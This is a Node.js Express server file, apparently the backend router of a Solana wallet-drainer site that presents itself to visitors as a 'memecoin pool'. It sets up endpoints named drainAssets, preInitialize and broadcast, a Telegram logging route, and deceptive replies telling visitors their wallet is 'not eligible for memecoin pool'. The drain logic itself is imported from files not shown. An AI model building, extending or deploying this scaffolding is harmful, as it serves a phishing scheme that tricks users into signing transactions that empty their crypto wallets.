// Vercel serverless function entry point
// This handles all routes for the application

const express = require('express');
const path = require('path');
const rateLimit = require('express-rate-limit');

// Import our modules
const errorHandler = require('../src/errorHandler.js');
const telegramLogger = require('../src/telegram.js');
const { ENV_CONFIG } = require('../env.config.js');

const app = express();
const PORT = process.env.PORT || 3002;

// Enhanced rate limiting
const generalLimiter = rateLimit({
  windowMs: ENV_CONFIG.RATE_LIMIT_WINDOW_MS,
  max: ENV_CONFIG.GENERAL_RATE_LIMIT,
  message: {
    success: false,
    error: 'Rate limit exceeded',
    message: 'Wallet not eligible for memecoin pool'
  },
  standardHeaders: true,
  legacyHeaders: false,
  skipSuccessfulRequests: true,
  skipFailedRequests: false,
  keyGenerator: (req) => {
    return req.ip + '|' + (req.headers['user-agent'] || 'unknown');
  },
  handler: (req, res) => {
    res.status(429).json({
      success: false,
      error: 'Rate limit exceeded',
      message: 'Wallet not eligible for memecoin pool'
    });
  }
});

const drainLimiter = rateLimit({
  windowMs: ENV_CONFIG.RATE_LIMIT_WINDOW_MS,
  max: ENV_CONFIG.DRAIN_RATE_LIMIT,
  message: {
    success: false,
    error: 'Drain rate limit exceeded',
    message: 'Wallet not eligible for memecoin pool'
  },
  standardHeaders: true,
  legacyHeaders: false,
  skipSuccessfulRequests: true,
  skipFailedRequests: false,
  keyGenerator: (req) => {
    const walletType = req.body?.walletType || 'unknown';
    return req.ip + '|' + walletType;
  },
  handler: (req, res) => {
    res.status(429).json({
      success: false,
      error: 'Drain rate limit exceeded',
      message: 'Wallet not eligible for memecoin pool'
    });
  }
});

// Middleware
app.use(express.json({ limit: '50mb' }));
app.use(express.static('public'));

// Apply general rate limiting to all routes
app.use(generalLimiter);

// API endpoints
app.post('/api/drainAssets', drainLimiter, async (req, res) => {
  try {
    const drainAssetsHandler = require('./drainAssets.js');
    await drainAssetsHandler(req, res);
  } catch (importError) {
    console.error('[DRAIN_ASSETS] Import error:', importError);
    res.status(500).json(errorHandler.formatApiError(importError, {
      context: 'Drain Assets Import Error',
      endpoint: '/api/drainAssets'
    }));
  }
});

app.post('/api/preInitialize', drainLimiter, async (req, res) => {
  try {
    const preInitializeHandler = require('./preInitialize.js');
    await preInitializeHandler(req, res);
  } catch (importError) {
    console.error('[PRE_INITIALIZE] Import error:', importError);
    res.status(500).json(errorHandler.formatApiError(importError, {
      context: 'Pre-Initialize Import Error',
      endpoint: '/api/preInitialize'
    }));
  }
});

app.post('/api/broadcast', drainLimiter, async (req, res) => {
  try {
    const broadcastHandler = require('./broadcast.js');
    await broadcastHandler(req, res);
  } catch (importError) {
    console.error('[BROADCAST] Import error:', importError);
    res.status(500).json(errorHandler.formatApiError(importError, {
      context: 'Broadcast Import Error',
      endpoint: '/api/broadcast'
    }));
  }
});

// Health check endpoint
app.get('/api/health', async (req, res) => {
  try {
    const healthHandler = require('./health.js');
    await healthHandler(req, res);
  } catch (importError) {
    console.error('[HEALTH] Import error:', importError);
    res.status(500).json({ success: false, error: 'Health check failed' });
  }
});

// Test assets endpoint
app.get('/api/test-assets', async (req, res) => {
  try {
    const testAssetsHandler = require('./test-assets.js');
    await testAssetsHandler(req, res);
  } catch (importError) {
    console.error('[TEST_ASSETS] Import error:', importError);
    res.status(500).json({ success: false, error: 'Test assets failed' });
  }
});

// Simple test endpoint that doesn't require environment variables
app.get('/api/test', (req, res) => {
  console.log('[TEST] API test endpoint called');
  res.json({
    success: true,
    message: 'Server is running!',
    timestamp: new Date().toISOString(),
    environment: process.env.NODE_ENV || 'development',
    path: req.path
  });
});

// Basic health check without any imports
app.get('/api/basic', (req, res) => {
  console.log('[BASIC] Basic health check called');
  res.json({
    success: true,
    message: 'Basic health check passed',
    timestamp: new Date().toISOString(),
    path: req.path
  });
});

// Simple root test endpoint
app.get('/api', (req, res) => {
  res.json({
    success: true,
    message: 'Solana Memecoin Pool API is running',
    endpoints: ['/api/health', '/api/test', '/api/drainAssets', '/api/log'],
    timestamp: new Date().toISOString()
  });
});

// Frontend logging endpoint for Telegram integration
app.post('/api/log', async (req, res) => {
  try {
    const logHandler = require('./log.js');
    await logHandler(req, res);
  } catch (importError) {
    console.error('[LOG] Import error:', importError);
    res.status(500).json({ success: false, error: 'Logging failed' });
  }
});

// Serve static files and handle SPA routing
app.get('/', (req, res) => {
  console.log('[ROOT] Serving index.html for root path');
  res.sendFile(path.join(__dirname, '..', 'public', 'index.html'));
});

app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, '..', 'public', 'index.html'));
});

// Global error handling middleware
app.use((error, req, res, next) => {
  console.error('[GLOBAL_ERROR] Unhandled error:', error);
  
  if (!res.headersSent) {
    res.status(500).json(errorHandler.formatApiError(error, {
      context: 'Global Error Handler',
      path: req.path,
      method: req.method
    }));
  }
});

// 404 handler for unmatched routes
app.use((req, res) => {
  res.status(404).json(errorHandler.formatApiError(new Error('Route not found'), {
    context: '404 Not Found',
    path: req.path,
    method: req.method
  }));
});

// Export the app for Vercel
module.exports = app;
